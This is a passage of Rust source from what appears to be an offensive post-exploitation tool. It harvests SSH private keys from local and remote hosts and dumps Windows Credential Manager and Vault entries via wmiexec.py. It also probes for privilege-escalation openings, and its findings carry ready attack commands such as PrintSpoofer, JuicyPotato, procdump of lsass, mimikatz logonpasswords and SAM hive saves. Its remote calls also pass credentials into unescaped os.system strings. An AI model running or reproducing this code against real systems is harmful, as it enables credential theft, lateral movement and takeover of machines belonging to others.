        module: PostExploitModule::DumpKeePass,
        target: config.target.clone(),
        success,
        findings,
        error: if success { None } else { Some("No KeePass databases found".to_string()) },
        timestamp: Utc::now(),
    })
}

async fn extract_ssh_keys(config: &PostExploitConfig) -> Result<PostExploitResult> {
    info!("Extracting SSH keys from {}", config.target);

    // For local extraction (target is localhost or 127.0.0.1)
    let is_local = config.target == "localhost" ||
                   config.target == "127.0.0.1" ||
                   config.target == "::1";

    if is_local {
        return extract_ssh_keys_local().await;
    }

    // For remote extraction, need SSH or SMB credentials
    let creds = match config.credentials.as_ref() {
        Some(c) => c,
        None => {
            return Ok(PostExploitResult {
                module: PostExploitModule::ExtractSshKeys,
                target: config.target.clone(),
                success: false,
                findings: vec![],
                error: Some("Credentials required for remote SSH key extraction".to_string()),
                timestamp: Utc::now(),
            });
        }
    };

    // Try SSH-based extraction for Linux targets
    let ssh_user = config.options.get("ssh_user")
        .and_then(|v| v.as_str())
        .map(|s| s.to_string())
        .unwrap_or_else(|| creds.username.clone());

    // Common SSH key locations to check
    let key_paths = vec![
        format!("/home/{}/.ssh/id_rsa", ssh_user),
        format!("/home/{}/.ssh/id_ed25519", ssh_user),
        format!("/home/{}/.ssh/id_ecdsa", ssh_user),
        format!("/home/{}/.ssh/id_dsa", ssh_user),
        "/root/.ssh/id_rsa".to_string(),
        "/root/.ssh/id_ed25519".to_string(),
        format!("/home/{}/.ssh/authorized_keys", ssh_user),
        format!("/home/{}/.ssh/known_hosts", ssh_user),
    ];

    let mut findings = Vec::new();

    for key_path in &key_paths {
        // Use SSH to cat the key file
        let ssh_cmd = format!(
            "cat {} 2>/dev/null | head -c 500",
            key_path
        );

        let mut ssh_args = vec![
            "-o".to_string(), "StrictHostKeyChecking=no".to_string(),
            "-o".to_string(), "BatchMode=yes".to_string(),
            "-o".to_string(), "ConnectTimeout=10".to_string(),
        ];

        let cmd_name = if creds.password.is_some() {
            ssh_args.insert(0, creds.password.as_ref().unwrap().clone());
            ssh_args.insert(0, "-p".to_string());
            "sshpass"
        } else {
            "ssh"
        };

        ssh_args.push(format!("{}@{}", creds.username, config.target));
        ssh_args.push(ssh_cmd);

        let result = tokio::time::timeout(
            Duration::from_secs(15),
            Command::new(cmd_name)
                .args(&ssh_args)
                .output()
        ).await;

        if let Ok(Ok(output)) = result {
            let content = String::from_utf8_lossy(&output.stdout);

            if !content.is_empty() {
                let is_encrypted = content.contains("ENCRYPTED") ||
                                   content.contains("Proc-Type: 4,ENCRYPTED");

                let key_type = if content.contains("BEGIN RSA PRIVATE KEY") ||
                                  content.contains("BEGIN OPENSSH PRIVATE KEY") {
                    "private_key"
                } else if content.contains("BEGIN PUBLIC KEY") ||
                          content.contains("ssh-rsa") ||
                          content.contains("ssh-ed25519") {
                    "public_key"
                } else if key_path.contains("authorized_keys") {
                    "authorized_keys"
                } else if key_path.contains("known_hosts") {
                    "known_hosts"
                } else {
                    "ssh_file"
                };

                let severity = match key_type {
                    "private_key" if !is_encrypted => Severity::Critical,
                    "private_key" => Severity::High,
                    "authorized_keys" => Severity::Medium,
                    _ => Severity::Low,
                };

                let mut details = HashMap::new();
                details.insert("path".to_string(), serde_json::json!(key_path));
                details.insert("type".to_string(), serde_json::json!(key_type));
                details.insert("encrypted".to_string(), serde_json::json!(is_encrypted));
                // Redact actual key content but show first line
                let first_line = content.lines().next().unwrap_or("");
                details.insert("preview".to_string(), serde_json::json!(first_line));

                findings.push(make_finding_with_details(
                    key_type,
                    key_path,
                    details,
                    severity,
                ));

                info!("Found {} at {} (encrypted: {})", key_type, key_path, is_encrypted);
            }
        }
    }

    let success = !findings.is_empty();
    Ok(PostExploitResult {
        module: PostExploitModule::ExtractSshKeys,
        target: config.target.clone(),
        success,
        findings,
        error: if success { None } else { Some("No SSH keys found or access denied".to_string()) },
        timestamp: Utc::now(),
    })
}

/// Local SSH key extraction (when running on target machine)
async fn extract_ssh_keys_local() -> Result<PostExploitResult> {
    let mut findings = Vec::new();

    // Get current user's home directory
    let home = std::env::var("HOME").unwrap_or_else(|_| "/root".to_string());
    let ssh_dir = std::path::Path::new(&home).join(".ssh");

    // Also check other users' home directories if we have permission
    let mut ssh_dirs = vec![ssh_dir.clone()];
    if let Ok(entries) = std::fs::read_dir("/home") {
        for entry in entries.flatten() {
            ssh_dirs.push(entry.path().join(".ssh"));
        }
    }
    ssh_dirs.push(std::path::PathBuf::from("/root/.ssh"));

    let key_files = vec![
        "id_rsa", "id_ed25519", "id_ecdsa", "id_dsa",
        "id_rsa.pub", "id_ed25519.pub", "id_ecdsa.pub", "id_dsa.pub",
        "authorized_keys", "known_hosts", "config",
    ];

    for ssh_dir in ssh_dirs {
        if !ssh_dir.exists() {
            continue;
        }

        for key_file in &key_files {
            let key_path = ssh_dir.join(key_file);
            if key_path.exists() {
                if let Ok(content) = tokio::fs::read_to_string(&key_path).await {
                    if content.is_empty() {
                        continue;
                    }

                    let is_encrypted = content.contains("ENCRYPTED") ||
                                       content.contains("Proc-Type: 4,ENCRYPTED");

                    let is_private = key_file.starts_with("id_") && !key_file.ends_with(".pub");

                    let key_type = if is_private {
                        "private_key"
                    } else if key_file.ends_with(".pub") {
                        "public_key"
                    } else if *key_file == "authorized_keys" {
                        "authorized_keys"
                    } else if *key_file == "known_hosts" {
                        "known_hosts"
                    } else {
                        "ssh_config"
                    };

                    let severity = match key_type {
                        "private_key" if !is_encrypted => Severity::Critical,
                        "private_key" => Severity::High,
                        "authorized_keys" => Severity::Medium,
                        _ => Severity::Low,
                    };

                    let mut details = HashMap::new();
                    details.insert("path".to_string(), serde_json::json!(key_path.display().to_string()));
                    details.insert("type".to_string(), serde_json::json!(key_type));
                    details.insert("encrypted".to_string(), serde_json::json!(is_encrypted));
                    details.insert("size".to_string(), serde_json::json!(content.len()));
                    // Redact key content
                    let first_line = content.lines().next().unwrap_or("");
                    details.insert("preview".to_string(), serde_json::json!(first_line));

                    findings.push(make_finding_with_details(
                        key_type,
                        &key_path.display().to_string(),
                        details,
                        severity,
                    ));
                }
            }
        }
    }

    let success = !findings.is_empty();
    Ok(PostExploitResult {
        module: PostExploitModule::ExtractSshKeys,
        target: "localhost".to_string(),
        success,
        findings,
        error: if success { None } else { Some("No SSH keys found".to_string()) },
        timestamp: Utc::now(),
    })
}

async fn dump_credman(config: &PostExploitConfig) -> Result<PostExploitResult> {
    info!("Dumping Credential Manager from {}", config.target);

    // Credential Manager is Windows-specific
    // We can use cmdkey /list for basic enumeration or vaultcmd

    let is_local = config.target == "localhost" ||
                   config.target == "127.0.0.1" ||
                   config.target == "::1";

    let mut findings = Vec::new();

    if is_local {
        // On Windows localhost, try cmdkey and vaultcmd
        // Since this is typically a Linux pentesting tool, local CredMan dump is less common
        // but we can check if running under Wine or similar

        // Try to run cmdkey (Windows only)
        let result = Command::new("cmdkey")
            .arg("/list")
            .output()
            .await;

        if let Ok(output) = result {
            let stdout = String::from_utf8_lossy(&output.stdout);
            if stdout.contains("Target:") {
                // Parse cmdkey output
                let mut current_target = String::new();
                let mut current_type = String::new();
                let mut current_user = String::new();

                for line in stdout.lines() {
                    let line = line.trim();
                    if line.starts_with("Target:") {
                        if !current_target.is_empty() {
                            // Save previous credential
                            let mut details = HashMap::new();
                            details.insert("target".to_string(), serde_json::json!(&current_target));
                            details.insert("type".to_string(), serde_json::json!(&current_type));
                            details.insert("user".to_string(), serde_json::json!(&current_user));

                            findings.push(make_finding_with_details(
                                "credman_entry",
                                &current_target,
                                details,
                                Severity::High,
                            ));
                        }
                        current_target = line[7..].trim().to_string();
                        current_type.clear();
                        current_user.clear();
                    } else if line.starts_with("Type:") {
                        current_type = line[5..].trim().to_string();
                    } else if line.starts_with("User:") {
                        current_user = line[5..].trim().to_string();
                    }
                }

                // Don't forget the last one
                if !current_target.is_empty() {
                    let mut details = HashMap::new();
                    details.insert("target".to_string(), serde_json::json!(&current_target));
                    details.insert("type".to_string(), serde_json::json!(&current_type));
                    details.insert("user".to_string(), serde_json::json!(&current_user));

                    findings.push(make_finding_with_details(
                        "credman_entry",
                        &current_target,
                        details,
                        Severity::High,
                    ));
                }
            }
        }
    } else {
        // Remote Credential Manager dump
        let creds = match config.credentials.as_ref() {
            Some(c) => c,
            None => {
                return Ok(PostExploitResult {
                    module: PostExploitModule::DumpCredMan,
                    target: config.target.clone(),
                    success: false,
                    findings: vec![],
                    error: Some("Credentials required for remote Credential Manager dump".to_string()),
                    timestamp: Utc::now(),
                });
            }
        };

        let creds_str = build_impacket_creds(&creds, &config.target);

        // Use cmdkey /list via WMI
        let result = tokio::time::timeout(
            Duration::from_secs(30),
            Command::new("wmiexec.py")
                .args([&creds_str, "cmdkey /list"])
                .output()
        ).await;

        if let Ok(Ok(output)) = result {
            let stdout = String::from_utf8_lossy(&output.stdout);

            if stdout.contains("Target:") || stdout.contains("Currently stored credentials") {
                let mut current_target = String::new();
                let mut current_type = String::new();
                let mut current_user = String::new();

                for line in stdout.lines() {
                    let line = line.trim();
                    if line.starts_with("Target:") {
                        if !current_target.is_empty() {
                            let mut details = HashMap::new();
                            details.insert("target".to_string(), serde_json::json!(&current_target));
                            details.insert("type".to_string(), serde_json::json!(&current_type));
                            details.insert("user".to_string(), serde_json::json!(&current_user));

                            findings.push(make_finding_with_details(
                                "credman_entry",
                                &current_target,
                                details,
                                Severity::High,
                            ));
                        }
                        current_target = line[7..].trim().to_string();
                        current_type.clear();
                        current_user.clear();
                    } else if line.starts_with("Type:") {
                        current_type = line[5..].trim().to_string();
                    } else if line.starts_with("User:") {
                        current_user = line[5..].trim().to_string();
                    }
                }

                if !current_target.is_empty() {
                    let mut details = HashMap::new();
                    details.insert("target".to_string(), serde_json::json!(&current_target));
                    details.insert("type".to_string(), serde_json::json!(&current_type));
                    details.insert("user".to_string(), serde_json::json!(&current_user));

                    findings.push(make_finding_with_details(
                        "credman_entry",
                        &current_target,
                        details,
                        Severity::High,
                    ));
                }
            }
        }

        // Also try vaultcmd for Windows Vault
        let vault_result = tokio::time::timeout(
            Duration::from_secs(30),
            Command::new("wmiexec.py")
                .args([&creds_str, "vaultcmd /list"])
                .output()
        ).await;

        if let Ok(Ok(output)) = vault_result {
            let stdout = String::from_utf8_lossy(&output.stdout);
            if stdout.contains("Vault:") || stdout.contains("Credentials:") {
                let mut details = HashMap::new();
                details.insert("vault_output".to_string(), serde_json::json!(stdout.chars().take(500).collect::<String>()));
                details.insert("note".to_string(), serde_json::json!(
                    "Windows Vault found. Use mimikatz or dpapi for full credential extraction."
                ));

                findings.push(make_finding_with_details(
                    "windows_vault",
                    "Windows Vault discovered",
                    details,
                    Severity::High,
                ));
            }
        }

        // If we have mimikatz available, try to use it for full dump
        // Check for dpapi module (if lsassy is installed)
        let dpapi_check = Command::new("which").arg("dpapi").output().await;
        if dpapi_check.is_ok() && dpapi_check.unwrap().status.success() {
            let mut details = HashMap::new();
            details.insert("tool".to_string(), serde_json::json!("dpapi"));
            details.insert("command".to_string(), serde_json::json!(
                format!("dpapi credman -u {} -target {}", creds.username, config.target)
            ));
            details.insert("note".to_string(), serde_json::json!(
                "DPAPI tool available. Can be used for credential decryption if master key is available."
            ));

            findings.push(make_finding_with_details(
                "dpapi_available",
                "DPAPI tool detected",
                details,
                Severity::Low,
            ));
        }
    }

    let success = !findings.is_empty();
    Ok(PostExploitResult {
        module: PostExploitModule::DumpCredMan,
        target: config.target.clone(),
        success,
        findings,
        error: if success { None } else { Some("No Credential Manager entries found or access denied".to_string()) },
        timestamp: Utc::now(),
    })
}

// ============================================================================
// Privilege Escalation Checks
// ============================================================================

async fn check_always_install_elevated(config: &PostExploitConfig) -> Result<PostExploitResult> {
    // Check registry keys for AlwaysInstallElevated vulnerability:
    // HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated = 1
    // HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated = 1
    // Both must be set to 1 for exploitation
    info!("Checking AlwaysInstallElevated on {}", config.target);

    let is_local = config.target == "localhost" ||
                   config.target == "127.0.0.1" ||
                   config.target == "::1";

    let mut findings = Vec::new();

    // Registry queries to check
    let reg_queries = vec![
        ("HKLM", r"HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer"),
        ("HKCU", r"HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer"),
    ];

    let mut hklm_elevated = false;
    let mut hkcu_elevated = false;

    for (hive, reg_path) in &reg_queries {
        let query_cmd = format!(
            "reg query \"{}\" /v AlwaysInstallElevated 2>nul",
            reg_path
        );

        let output = if is_local {
            // Local Windows check
            Command::new("cmd")
                .args(["/c", &query_cmd])
                .output()
                .await
        } else {
            // Remote check via WMI or psexec
            let creds = match config.credentials.as_ref() {
                Some(c) => c,
                None => continue,
            };

            // Use impacket's wmiexec for remote registry query
            let wmi_cmd = format!(
                "wmiexec.py {}:{}@{} \"{}\"",
                creds.username,
                creds.password.as_deref().unwrap_or(""),
                config.target,
                query_cmd
            );

            tokio::time::timeout(
                Duration::from_secs(30),
                Command::new("python3")
                    .args(["-c", &format!("import os; os.system('{}')", wmi_cmd)])
                    .output()
            ).await.unwrap_or_else(|_| Err(std::io::Error::new(std::io::ErrorKind::TimedOut, "Timeout")))
        };

        if let Ok(output) = output {
            let stdout = String::from_utf8_lossy(&output.stdout);

            // Check if AlwaysInstallElevated is set to 1 (0x1)
            if stdout.contains("0x1") || stdout.contains("REG_DWORD") && stdout.contains("1") {
                if *hive == "HKLM" {
                    hklm_elevated = true;
                } else {
                    hkcu_elevated = true;
                }

                let mut details = HashMap::new();
                details.insert("registry_hive".to_string(), serde_json::json!(hive));
                details.insert("registry_path".to_string(), serde_json::json!(reg_path));
                details.insert("value".to_string(), serde_json::json!("1"));

                findings.push(make_finding_with_details(
                    "always_install_elevated_key",
                    *hive,
                    details,
                    Severity::High,
                ));
            }
        }
    }

    // If both HKLM and HKCU are set, the system is exploitable
    if hklm_elevated && hkcu_elevated {
        let mut details = HashMap::new();
        details.insert("hklm_enabled".to_string(), serde_json::json!(true));
        details.insert("hkcu_enabled".to_string(), serde_json::json!(true));
        details.insert("exploitable".to_string(), serde_json::json!(true));
        details.insert("exploit_method".to_string(), serde_json::json!(
            "Create malicious .msi installer that runs with SYSTEM privileges"
        ));
        details.insert("remediation".to_string(), serde_json::json!(
            "Set both registry keys to 0 or delete them. Use Group Policy to disable."
        ));

        findings.push(make_finding_with_details(
            "always_install_elevated_vuln",
            "EXPLOITABLE",
            details,
            Severity::Critical,
        ));
    }

    let success = !findings.is_empty() || hklm_elevated || hkcu_elevated;

    Ok(PostExploitResult {
        module: PostExploitModule::CheckAlwaysInstallElevated,
        target: config.target.clone(),
        success,
        findings,
        error: if !success && !is_local && config.credentials.is_none() {
            Some("Credentials required for remote registry check".to_string())
        } else { None },
        timestamp: Utc::now(),
    })
}

async fn check_unquoted_paths(config: &PostExploitConfig) -> Result<PostExploitResult> {
    // Look for services with unquoted paths containing spaces
    // If path is like: C:\Program Files\Some App\service.exe
    // And it's not quoted, Windows will try:
    // C:\Program.exe, C:\Program Files\Some.exe, etc.
    info!("Checking for unquoted service paths on {}", config.target);

    let is_local = config.target == "localhost" ||
                   config.target == "127.0.0.1" ||
                   config.target == "::1";

    let mut findings = Vec::new();

    // Query all services and their image paths using WMIC
    let wmic_cmd = "wmic service get name,displayname,pathname,startmode 2>nul";

    let output = if is_local {
        Command::new("cmd")
            .args(["/c", wmic_cmd])
            .output()
            .await
    } else {
        let creds = match config.credentials.as_ref() {
            Some(c) => c,
            None => {
                return Ok(PostExploitResult {
                    module: PostExploitModule::CheckUnquotedPaths,
                    target: config.target.clone(),
                    success: false,
                    findings: vec![],
                    error: Some("Credentials required for remote service enumeration".to_string()),
                    timestamp: Utc::now(),
                });
            }
        };

        let wmi_cmd = format!(
            "wmiexec.py {}:{}@{} \"{}\"",
            creds.username,
            creds.password.as_deref().unwrap_or(""),
            config.target,
            wmic_cmd
        );

        tokio::time::timeout(
            Duration::from_secs(60),
            Command::new("python3")
                .args(["-c", &format!("import os; os.system('{}')", wmi_cmd)])
                .output()
        ).await.unwrap_or_else(|_| Err(std::io::Error::new(std::io::ErrorKind::TimedOut, "Timeout")))
    };

    if let Ok(output) = output {
        let stdout = String::from_utf8_lossy(&output.stdout);

        for line in stdout.lines() {
            let line = line.trim();
            if line.is_empty() || line.starts_with("DisplayName") || line.starts_with("Name") {
                continue;
            }

            // Look for paths that contain spaces but aren't quoted
            // Skip paths that start with quotes
            if line.contains(' ') && !line.contains('"') {
                // Extract path - look for common executable extensions
                for ext in &[".exe", ".EXE", ".Exe"] {
                    if let Some(exe_pos) = line.find(ext) {
                        let path_end = exe_pos + ext.len();
                        let potential_path = &line[..path_end];

                        // Check if path contains spaces and is under Program Files or similar
                        if potential_path.contains(' ') &&
                           (potential_path.contains("Program Files") ||
                            potential_path.contains("Program Files (x86)") ||
                            potential_path.contains("ProgramData") ||
                            potential_path.contains("Application Data")) {

                            // Determine which directories are writable/exploitable
                            let exploitable_dirs = find_exploitable_path_segments(potential_path);

                            if !exploitable_dirs.is_empty() {
                                let mut details = HashMap::new();
                                details.insert("service_line".to_string(), serde_json::json!(line));
                                details.insert("unquoted_path".to_string(), serde_json::json!(potential_path));
                                details.insert("exploitable_locations".to_string(),
                                    serde_json::json!(exploitable_dirs));
                                details.insert("exploit_method".to_string(), serde_json::json!(
                                    "Place malicious executable at one of the exploitable locations"
                                ));

                                // Try to extract service name (usually first field)
                                let service_name = line.split_whitespace().next().unwrap_or("Unknown");

                                findings.push(make_finding_with_details(
                                    "unquoted_service_path",
                                    service_name,
                                    details,
                                    Severity::High,
                                ));
                            }
                        }
                    }
                }
            }
        }
    }

    let success = !findings.is_empty();

    Ok(PostExploitResult {
        module: PostExploitModule::CheckUnquotedPaths,
        target: config.target.clone(),
        success,
        findings,
        error: None,
        timestamp: Utc::now(),
    })
}

/// Find exploitable path segments for unquoted service path attack
fn find_exploitable_path_segments(path: &str) -> Vec<String> {
    let mut exploitable = Vec::new();

    // Split path by backslash and find segments with spaces
    let parts: Vec<&str> = path.split('\\').collect();
    let mut current_path = String::new();

    for (i, part) in parts.iter().enumerate() {
        if i == 0 {
            current_path = part.to_string();
            continue;
        }

        if part.contains(' ') {
            // Find the first space in this segment
            if let Some(space_pos) = part.find(' ') {
                let truncated = &part[..space_pos];
                let exploit_path = format!("{}\\{}.exe", current_path, truncated);
                exploitable.push(exploit_path);
            }
        }

        current_path = format!("{}\\{}", current_path, part);
    }

    exploitable
}

async fn check_weak_service_perms(config: &PostExploitConfig) -> Result<PostExploitResult> {
    // Check for services with weak permissions using accesschk or sc sdshow
    // Weak permissions allow modification of service binary path or configuration
    info!("Checking for weak service permissions on {}", config.target);

    let is_local = config.target == "localhost" ||
                   config.target == "127.0.0.1" ||
                   config.target == "::1";

    let mut findings = Vec::new();

    // Get list of all services
    let sc_query_cmd = "sc query state= all 2>nul";

    let service_output = if is_local {
        Command::new("cmd")
            .args(["/c", sc_query_cmd])
            .output()
            .await
    } else {
        let creds = match config.credentials.as_ref() {
            Some(c) => c,
            None => {
                return Ok(PostExploitResult {
                    module: PostExploitModule::CheckWeakServicePerms,
                    target: config.target.clone(),
                    success: false,
                    findings: vec![],
                    error: Some("Credentials required for remote service enumeration".to_string()),
                    timestamp: Utc::now(),
                });
            }
        };

        let wmi_cmd = format!(
            "wmiexec.py {}:{}@{} \"{}\"",
            creds.username,
            creds.password.as_deref().unwrap_or(""),
            config.target,
            sc_query_cmd
        );

        tokio::time::timeout(
            Duration::from_secs(60),
            Command::new("python3")
                .args(["-c", &format!("import os; os.system('{}')", wmi_cmd)])
                .output()
        ).await.unwrap_or_else(|_| Err(std::io::Error::new(std::io::ErrorKind::TimedOut, "Timeout")))
    };

    // Extract service names
    let mut service_names: Vec<String> = Vec::new();
    if let Ok(output) = service_output {
        let stdout = String::from_utf8_lossy(&output.stdout);
        for line in stdout.lines() {
            if line.contains("SERVICE_NAME:") {
                if let Some(name) = line.split(':').nth(1) {
                    service_names.push(name.trim().to_string());
                }
            }
        }
    }

    // Check permissions for each service using sc sdshow
    // Dangerous permissions: DC (change config), WD (write DAC), WO (write owner)
    let dangerous_perms = vec![
        ("DC", "SERVICE_CHANGE_CONFIG - Can modify service configuration"),
        ("WD", "WRITE_DAC - Can change permissions"),
        ("WO", "WRITE_OWNER - Can change owner"),
        ("RP", "SERVICE_START - Can start service"),
        ("WP", "SERVICE_STOP - Can stop service"),
        ("CC", "SERVICE_QUERY_CONFIG - Can query configuration"),
        ("GA", "GENERIC_ALL - Full control"),
        ("GW", "GENERIC_WRITE - Write access"),
    ];

    // Check a sample of services (checking all would be slow)
    let services_to_check: Vec<&String> = service_names.iter().take(50).collect();

    for service_name in services_to_check {
        let sdshow_cmd = format!("sc sdshow \"{}\" 2>nul", service_name);

        let output = if is_local {
            Command::new("cmd")
                .args(["/c", &sdshow_cmd])
                .output()
                .await
        } else {
            let creds = config.credentials.as_ref().unwrap();
            let wmi_cmd = format!(
                "wmiexec.py {}:{}@{} \"{}\"",
                creds.username,
                creds.password.as_deref().unwrap_or(""),
                config.target,
                sdshow_cmd
            );

            tokio::time::timeout(
                Duration::from_secs(30),
                Command::new("python3")
                    .args(["-c", &format!("import os; os.system('{}')", wmi_cmd)])
                    .output()
            ).await.unwrap_or_else(|_| Err(std::io::Error::new(std::io::ErrorKind::TimedOut, "Timeout")))
        };

        if let Ok(output) = output {
            let stdout = String::from_utf8_lossy(&output.stdout);
            let sddl = stdout.trim();

            // Parse SDDL to find dangerous permissions for non-admin users
            // Look for AU (Authenticated Users), BU (Built-in Users), WD (Everyone)
            let weak_trustees = vec![
                ("AU", "Authenticated Users"),
                ("BU", "Built-in Users"),
                ("WD", "Everyone"),
                ("IU", "Interactive Users"),
            ];

            for (trustee_code, trustee_name) in &weak_trustees {
                // Check if this trustee has dangerous permissions
                // SDDL format: (A;;PERMISSIONS;;;TRUSTEE)
                if sddl.contains(trustee_code) {
                    for (perm_code, perm_desc) in &dangerous_perms {
                        // Look for permission code before trustee
                        let pattern = format!("{};", perm_code);
                        if sddl.contains(&pattern) && sddl.contains(trustee_code) {
                            // Only report if this is a significant permission
                            if *perm_code == "DC" || *perm_code == "GA" || *perm_code == "GW" ||
                               *perm_code == "WD" || *perm_code == "WO" {

                                let mut details = HashMap::new();
                                details.insert("service_name".to_string(), serde_json::json!(service_name));
                                details.insert("sddl".to_string(), serde_json::json!(sddl));
                                details.insert("trustee".to_string(), serde_json::json!(trustee_name));
                                details.insert("permission".to_string(), serde_json::json!(perm_desc));
                                details.insert("exploit_method".to_string(), serde_json::json!(
                                    if *perm_code == "DC" || *perm_code == "GA" || *perm_code == "GW" {
                                        "Use 'sc config' to change service binary path to malicious executable"
                                    } else {
                                        "Modify service DACL to grant full control, then exploit"
                                    }
                                ));

                                findings.push(make_finding_with_details(
                                    "weak_service_permission",
                                    service_name,
                                    details,
                                    Severity::High,
                                ));
                                break; // One finding per service is enough
                            }
                        }
                    }
                }
            }
        }
    }

    let success = !findings.is_empty();

    Ok(PostExploitResult {
        module: PostExploitModule::CheckWeakServicePerms,
        target: config.target.clone(),
        success,
        findings,
        error: None,
        timestamp: Utc::now(),
    })
}

async fn check_se_impersonate(config: &PostExploitConfig) -> Result<PostExploitResult> {
    // Check for SeImpersonatePrivilege (Potato attacks - JuicyPotato, PrintSpoofer, etc.)
    // This privilege allows impersonating tokens, which can lead to SYSTEM access
    info!("Checking for SeImpersonate privilege on {}", config.target);

    let is_local = config.target == "localhost" ||
                   config.target == "127.0.0.1" ||
                   config.target == "::1";

    let mut findings = Vec::new();

    // Dangerous privileges to check for
    let dangerous_privileges = vec![
        ("SeImpersonatePrivilege", "Impersonate a client after authentication",
         "JuicyPotato, PrintSpoofer, RoguePotato, SweetPotato", Severity::Critical),
        ("SeAssignPrimaryTokenPrivilege", "Replace a process level token",
         "Token manipulation attacks", Severity::Critical),
        ("SeBackupPrivilege", "Back up files and directories",
         "Read any file including SAM/SYSTEM hives", Severity::High),
        ("SeRestorePrivilege", "Restore files and directories",
         "Write any file, modify registry", Severity::High),
        ("SeDebugPrivilege", "Debug programs",
         "Inject into any process, dump LSASS", Severity::Critical),
        ("SeTakeOwnershipPrivilege", "Take ownership of files/objects",
         "Take ownership then modify ACLs", Severity::High),
        ("SeLoadDriverPrivilege", "Load and unload device drivers",
         "Load malicious driver for kernel code execution", Severity::Critical),
        ("SeTcbPrivilege", "Act as part of the operating system",
         "Create tokens with any privileges", Severity::Critical),
        ("SeCreateTokenPrivilege", "Create a token object",
         "Create arbitrary tokens", Severity::Critical),
    ];

    // Get current user privileges
    let whoami_cmd = "whoami /priv 2>nul";

    let output = if is_local {
        Command::new("cmd")
            .args(["/c", whoami_cmd])
            .output()
            .await
    } else {
        let creds = match config.credentials.as_ref() {
            Some(c) => c,
            None => {
                return Ok(PostExploitResult {
                    module: PostExploitModule::CheckSeImpersonate,
                    target: config.target.clone(),
                    success: false,
                    findings: vec![],
                    error: Some("Credentials required for remote privilege check".to_string()),
                    timestamp: Utc::now(),
                });
            }
        };

        let wmi_cmd = format!(
            "wmiexec.py {}:{}@{} \"{}\"",
            creds.username,
            creds.password.as_deref().unwrap_or(""),
            config.target,
            whoami_cmd
        );

        tokio::time::timeout(
            Duration::from_secs(30),
            Command::new("python3")
                .args(["-c", &format!("import os; os.system('{}')", wmi_cmd)])
                .output()
        ).await.unwrap_or_else(|_| Err(std::io::Error::new(std::io::ErrorKind::TimedOut, "Timeout")))
    };

    if let Ok(output) = output {
        let stdout = String::from_utf8_lossy(&output.stdout);

        for (priv_name, priv_desc, exploit_tools, severity) in &dangerous_privileges {
            // Check if privilege exists and is enabled
            for line in stdout.lines() {
                if line.contains(priv_name) {
                    let is_enabled = line.contains("Enabled");
                    let is_disabled = line.contains("Disabled");

                    if is_enabled || is_disabled {
                        let mut details = HashMap::new();
                        details.insert("privilege".to_string(), serde_json::json!(priv_name));
                        details.insert("description".to_string(), serde_json::json!(priv_desc));
                        details.insert("enabled".to_string(), serde_json::json!(is_enabled));
                        details.insert("exploit_tools".to_string(), serde_json::json!(exploit_tools));

                        // Add specific exploitation notes
                        if *priv_name == "SeImpersonatePrivilege" {
                            details.insert("exploit_method".to_string(), serde_json::json!(
                                "Use JuicyPotato (pre-Win10 1809) or PrintSpoofer/RoguePotato (Win10+) to get SYSTEM"
                            ));
                            details.insert("commands".to_string(), serde_json::json!([
                                "PrintSpoofer.exe -i -c cmd",
                                "JuicyPotato.exe -l 1337 -p c:\\windows\\system32\\cmd.exe -t * -c {CLSID}",
                                "RoguePotato.exe -r YOUR_IP -e 'cmd.exe' -l 9999"
                            ]));
                        } else if *priv_name == "SeDebugPrivilege" {
                            details.insert("exploit_method".to_string(), serde_json::json!(
                                "Dump LSASS memory for credentials or inject into privileged process"
                            ));
                            details.insert("commands".to_string(), serde_json::json!([
                                "procdump.exe -ma lsass.exe lsass.dmp",
                                "mimikatz.exe sekurlsa::logonpasswords"
                            ]));
                        } else if *priv_name == "SeBackupPrivilege" {
                            details.insert("exploit_method".to_string(), serde_json::json!(
                                "Copy SAM/SYSTEM hives and extract password hashes"
                            ));
                            details.insert("commands".to_string(), serde_json::json!([
                                "reg save HKLM\\SAM sam.hive",
                                "reg save HKLM\\SYSTEM system.hive"
                            ]));
                        }

                        let effective_severity = if is_enabled { severity.clone() } else { Severity::Medium };

                        findings.push(make_finding_with_details(
                            "dangerous_privilege",
                            *priv_name,
                            details,
                            effective_severity,
                        ));
                    }
                }
            }
        }
    }

    // Also check group memberships for high-privileged groups
    let groups_cmd = "whoami /groups 2>nul";

    let groups_output = if is_local {
        Command::new("cmd")
            .args(["/c", groups_cmd])
            .output()
            .await
    } else {
        let creds = config.credentials.as_ref().unwrap();
        let wmi_cmd = format!(
            "wmiexec.py {}:{}@{} \"{}\"",
            creds.username,
            creds.password.as_deref().unwrap_or(""),
            config.target,
            groups_cmd
        );

        tokio::time::timeout(
            Duration::from_secs(30),
            Command::new("python3")
                .args(["-c", &format!("import os; os.system('{}')", wmi_cmd)])
                .output()
        ).await.unwrap_or_else(|_| Err(std::io::Error::new(std::io::ErrorKind::TimedOut, "Timeout")))
    };

    let high_priv_groups = vec![
        ("BUILTIN\\Administrators", "Local Administrator", Severity::Critical),
        ("Domain Admins", "Domain Administrator", Severity::Critical),
        ("Enterprise Admins", "Enterprise Administrator", Severity::Critical),
        ("Schema Admins", "Schema Administrator", Severity::Critical),
        ("Account Operators", "Can manage domain accounts", Severity::High),
        ("Backup Operators", "Backup privilege on domain", Severity::High),
        ("Server Operators", "Server management rights", Severity::High),
        ("Print Operators", "Printer/driver management", Severity::Medium),
        ("DnsAdmins", "DNS Server admin - SYSTEM code exec possible", Severity::High),
    ];

    if let Ok(output) = groups_output {
        let stdout = String::from_utf8_lossy(&output.stdout);

        for (group_name, group_desc, severity) in &high_priv_groups {
            if stdout.contains(group_name) {
                let mut details = HashMap::new();
                details.insert("group".to_string(), serde_json::json!(group_name));
                details.insert("description".to_string(), serde_json::json!(group_desc));
                details.insert("type".to_string(), serde_json::json!("group_membership"));

                if *group_name == "DnsAdmins" {
                    details.insert("exploit_method".to_string(), serde_json::json!(
                        "Register malicious DLL as DNS plugin for code execution as SYSTEM on DC"
                    ));
                }

                findings.push(make_finding_with_details(
                    "high_privilege_group",
                    *group_name,
                    details,
                    severity.clone(),
                ));
            }
        }
    }

    let success = !findings.is_empty();

    Ok(PostExploitResult {
        module: PostExploitModule::CheckSeImpersonate,
        target: config.target.clone(),
        success,
        findings,
        error: None,
        timestamp: Utc::now(),
    })
}

async fn check_sudoers(config: &PostExploitConfig) -> Result<PostExploitResult> {
    info!("Checking sudo configuration on {}", config.target);

